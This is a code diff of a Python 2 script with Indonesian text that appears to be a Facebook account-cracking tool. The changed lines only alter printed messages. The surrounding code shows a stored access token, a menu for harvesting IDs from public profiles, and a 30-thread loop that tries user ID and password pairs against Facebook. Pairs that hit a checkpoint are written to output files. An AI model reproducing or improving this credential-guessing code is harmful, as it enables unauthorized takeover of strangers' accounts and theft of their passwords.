@@ -128,7 +128,7 @@ def masuk():
 			zedd = open("login.txt", 'w')
 			zedd.write(token)
 			zedd.close()
-			print (" √ Login Berhasil ")
+			print (" √ Mantap... Login Berhasil ")
 			hamz_bot()
 		except KeyError:
 			print (" × token invalid") 
@@ -152,7 +152,7 @@ def menu():
 		print (' × tidak ada koneksi harap sambungkan koneksi anda')
 		sys.exit()
 	logo()
-	print" \033[0;95m  NAMA       : "+nama
+	print" \033[0;95m  NAMA AKUN  : "+nama
 	print" \033[0;95m  IP ADDRESS : "+ip
 	print" \033[0;94m  #-----------------------------------#"
 	print" \033[0;93m  1. CARI DARI ID PUBLIK"
@@ -275,10 +275,10 @@ def hamz_ganteng():
 					continue
 					continue
 				elif "www.facebook.com" in send.json()["error_msg"]:
-					print'\r \033[0;94m >,< ' +uid+ ' | ' + pw+ '        '
+					print'\r \033[0;94m <Hasil> ' +uid+ ' | ' + pw+ '        '
 					cp.append(uid+' | '+pw)
 					save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
-					save.write(' \033[0;94m >,< ' +str(uid)+' | '+str(pw)+'\n')
+					save.write(' \033[0;94m ✓✓ ' +str(uid)+' | '+str(pw)+'\n')
 					save.close()
 					break
 					continue
@@ -289,7 +289,7 @@ def hamz_ganteng():
 			pass
 	p = ThreadPool(30)
 	p.map(main, id)
-	print(" \ncari akun nya FACEBOOK nya SELESAI LANGSUNG SALIN KE NOTEPAD")
+	print(" \ncari akun FACEBOOK nya SELESAI LANGSUNG SALIN KE NOTEPAD")
 	exit()
 
 def manual():
